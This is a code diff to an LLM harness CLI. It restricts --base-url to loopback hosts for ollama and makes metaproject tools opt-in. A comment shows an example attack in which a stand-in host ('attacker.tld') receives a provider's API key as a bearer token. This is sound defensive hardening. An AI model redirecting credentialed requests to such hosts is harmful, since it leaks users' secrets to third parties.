@@ -69,11 +69,13 @@ import type { MetaprojectPort } from "../harness/tool/metaproject-port";
 import { toToolDefinitions, METAPROJECT_OPERATIONS } from "../harness/tool/metaproject-operations";
 import { builtinMetaprojectTools, makeKeryxRunner } from "../harness/tool/builtin/metaproject-tools";
 import type { ToolDefinition } from "../harness/tool/types";
+import { isLoopbackHost } from "../harness/mutation/guard";
 import {
   OPENAI_COMPAT_PROVIDERS,
   credentialEnvKeyFor,
   isKnownProvider,
   knownProviderNames,
+  providerByName,
 } from "./providers";
 import { envWithSavedApiKeys } from "../lib/shell-config";
 import { realpathSync } from "node:fs";
@@ -216,6 +218,13 @@ export interface HarnessCommandDeps {
    * the workspace; a test supplies a fake so the run touches no graph on disk.
    */
   metaprojectPort?: MetaprojectPort;
+  /**
+   * Injected secret scanner. A real CLI invocation supplies none and
+   * `buildHarnessScanner(process.cwd())` resolves the project's detectors; a
+   * test supplies one so the redaction branch on the tool-output path can be
+   * exercised without planting a real secret on disk.
+   */
+  scan?: (content: string) => ScanResult;
 }
 
 /** Resolve the shared runtime deps (env/clock/idSeq) with the run-path fallback. */
@@ -263,6 +272,8 @@ interface ParsedArgs {
   prompt: string;
   /** `--record <path>`: write the run's replayable hash surface to a file. */
   record?: string;
+  /** `--tools`: register the read-only metaproject tools for this run. */
+  tools: boolean;
 }
 
 /**
@@ -274,7 +285,7 @@ interface ParsedArgs {
  * benchmark already found the first two disagreeing.
  */
 const USAGE = [
-  `Usage: keryx harness run --provider <${knownProviderNames().join("|")}> --model <m> [--base-url <url>] [--record <path>] "<prompt>"`,
+  `Usage: keryx harness run --provider <${knownProviderNames().join("|")}> --model <m> [--base-url <url>] [--record <path>] [--tools] "<prompt>"`,
   "       keryx harness exec [--allow-env KEY]... [--max-runtime-ms N] [--allow-real-subprocess]",
       "         [--allowed-domains a,b] [--mask-env NAME@host] [--tls-terminate] [--mask-mode auto|manual|off] [--auto-mask]",
       "         -- <path> [args...]",
@@ -286,6 +297,48 @@ const USAGE = [
 /** A read-only-review profile (defaults.read = "allow"), per policy-profile.schema.json. */
 function readOnlyProfile(): PolicyProfile {
   return resolveLocalProfile("read-only-review");
+}
+
+/**
+ * Whether `--base-url <url>` may be honoured for `provider`, and why not when it
+ * may not. Returns the refusal text, or `undefined` when the base URL is allowed.
+ *
+ * The rule is one sentence: **`--base-url` is honoured only for `ollama`, and
+ * only when it names a loopback host.** Two holes closed, both newly reachable
+ * on the CI-facing surface because this command's accepted-provider set widened:
+ *
+ *  1. `--provider ollama --base-url https://any-public-host/` passed the
+ *     credential gate (ollama needs no key) and then sailed through the
+ *     provider's egress guard, which rejects private/loopback/link-local/
+ *     metadata hosts but not arbitrary public ones. "ollama (loopback)" was
+ *     documented containment that did not exist.
+ *  2. `--provider deepseek --base-url https://attacker.tld` sent
+ *     `Bearer $DEEPSEEK_API_KEY` to whatever host was named. The credential is
+ *     chosen by the provider name and the destination was not, so the two could
+ *     be pointed at different parties. A registry provider's base URL is part of
+ *     its identity; it comes from the registry.
+ *
+ * Refusal rather than silent ignoring: a flag that is accepted and discarded
+ * teaches the caller a false model of what ran.
+ */
+export function refuseBaseUrl(provider: string, baseUrl: string): string | undefined {
+  if (provider === "ollama") {
+    let host: string;
+    try {
+      host = new URL(baseUrl).hostname;
+    } catch {
+      return `--base-url ${baseUrl} is not a URL. The ollama provider accepts a loopback base URL only (e.g. http://127.0.0.1:11434).`;
+    }
+    if (!isLoopbackHost(host)) {
+      return `--base-url ${baseUrl} names ${host}, which is not loopback. The ollama provider is a LOCAL runtime and this command will not point it at a remote host; no network was contacted.`;
+    }
+    return undefined;
+  }
+  const registryProvider = providerByName(provider);
+  if (registryProvider !== undefined) {
+    return `--base-url is not accepted for ${provider}: its base URL (${registryProvider.baseUrl}) is part of the provider's identity, and overriding it would send ${registryProvider.envKey} to a host the registry never named. No network was contacted.`;
+  }
+  return `--base-url is not accepted for ${provider}; it is honoured only for ollama, and only for a loopback host.`;
 }
 
 /**
@@ -309,6 +362,19 @@ export interface HarnessToolRunRecord {
 function hashOutput(content: string): string {
   return createHash("sha256").update(content, "utf8").digest("hex");
 }
+
+/**
+ * The executor paired with the EMPTY registry a run without `--tools` gets. The
+ * registry gate already means no call can reach it; this is the fail-closed
+ * floor if one ever did, and it never succeeds silently.
+ */
+const denyingExecutor: ToolExecutorPort = {
+  invoke: async (invocation: ToolInvocation): Promise<ToolResult> => {
+    throw new Error(
+      `no tool executor is configured for this run: ${invocation.call.toolName} (pass --tools to register the read-only metaproject tools)`,
+    );
+  },
+};
 
 /**
  * The read-only metaproject tools, registered for a non-interactive run.
@@ -416,12 +482,13 @@ function buildMetaprojectTooling(
   return { registry, executor, records };
 }
 
-/** Parse `run --provider <p> --model <m> [--base-url <url>] "<prompt>"`. */
+/** Parse `run --provider <p> --model <m> [--base-url <url>] [--tools] "<prompt>"`. */
 function parseArgs(args: string[]): ParsedArgs {
   let provider = "";
   let model = "";
   let baseUrl: string | undefined;
   let record: string | undefined;
+  let tools = false;
   const positional: string[] = [];
 
   // args[0] is the "run" subcommand.
@@ -435,12 +502,14 @@ function parseArgs(args: string[]): ParsedArgs {
       baseUrl = args[++i];
     } else if (arg === "--record") {
       record = args[++i];
+    } else if (arg === "--tools") {
+      tools = true;
     } else if (arg !== undefined) {
       positional.push(arg);
     }
   }
 
-  const parsed: ParsedArgs = { provider, model, prompt: positional.join(" ") };
+  const parsed: ParsedArgs = { provider, model, prompt: positional.join(" "), tools };
   if (baseUrl !== undefined) parsed.baseUrl = baseUrl;
   if (record !== undefined) parsed.record = record;
   return parsed;
@@ -484,7 +553,7 @@ export async function harnessCommand(args: string[], deps?: HarnessCommandDeps):
     return;
   }
 
-  const { provider, model, baseUrl, prompt, record } = parseArgs(args);
+  const { provider, model, baseUrl, prompt, record, tools } = parseArgs(args);
 
   // UX guard (flow 021, T5 / AC4): an invalid/empty --provider or an empty
   // prompt prints the usage line and returns BEFORE building input or running
@@ -498,6 +567,18 @@ export async function harnessCommand(args: string[], deps?: HarnessCommandDeps):
   if (!isKnownProvider(provider) || prompt.length === 0) {
     console.log(USAGE);
     return;
+  }
+
+  // Destination guard, BEFORE the credential is read and before anything is
+  // constructed: see `refuseBaseUrl`. A refused base URL is an argument error,
+  // so it is reported ahead of the credential abort — a caller who typed a bad
+  // destination should be told about the destination, not about a key.
+  if (baseUrl !== undefined) {
+    const refusal = refuseBaseUrl(provider, baseUrl);
+    if (refusal !== undefined) {
+      console.log(refusal);
+      return;
+    }
   }
 
   const env = deps?.env ?? process.env;
@@ -516,8 +597,9 @@ export async function harnessCommand(args: string[], deps?: HarnessCommandDeps):
   // while only anthropic could fail closed would have traded a usage error for a
   // credential-less run against a hosted endpoint — a strictly worse trade, and
   // the reason `credentialEnvKeyFor` lives beside the registry it is derived
-  // from. `fake` (offline) and `ollama` (loopback) need no credential and are
-  // unaffected.
+  // from. `fake` (never opens a socket) and `ollama` (local runtime, no key)
+  // need no credential; the destination guard above is what keeps the second one
+  // local, since needing no key is not the same as reaching nowhere.
   const credentialEnvKey = credentialEnvKeyFor(provider);
   if (credentialEnvKey !== undefined) {
     const apiKey = env[credentialEnvKey];
@@ -566,8 +648,26 @@ export async function harnessCommand(args: string[], deps?: HarnessCommandDeps):
   // The real content scanner for redaction-before-persistence. Resolved here,
   // once, because the run loop is synchronous and may not read the config from
   // inside itself; without it the loop falls back to a stub that finds nothing.
-  const { scan } = await buildHarnessScanner(process.cwd());
-  const tooling = buildMetaprojectTooling(process.cwd(), scan, clock, deps?.metaprojectPort);
+  const { scan } = deps?.scan !== undefined ? { scan: deps.scan } : await buildHarnessScanner(process.cwd());
+
+  // Tool registration is OPT-IN (`--tools`), and the default is OFF.
+  //
+  // Not timidity — the loop it feeds is single-turn. `runOffline` opens exactly
+  // one provider stream, executes whatever tools the model named, and returns;
+  // the results are recorded under `tools` but never appended to the messages,
+  // and there is no second request. So a model that is told about twelve tools
+  // and stops on a tool call gets no answer back and produces little or no
+  // text — degrading output for exactly the prompts tools were supposed to
+  // help with. Advertising a capability the loop cannot complete is the same
+  // over-promise this flow exists to remove, one layer down.
+  //
+  // Behind the flag it is honest and useful: the caller asked, the tool runs,
+  // and its output is in the printed blob for a script to read. The default
+  // flips when the loop learns to take a second turn, and this comment is the
+  // note to whoever does that.
+  const tooling = tools
+    ? buildMetaprojectTooling(process.cwd(), scan, clock, deps?.metaprojectPort)
+    : { registry: new ToolRegistry(), executor: denyingExecutor, records: [] as HarnessToolRunRecord[] };
   const runDeps: RunDeps = {
     provider: providerPort,
     toolRegistry: tooling.registry,
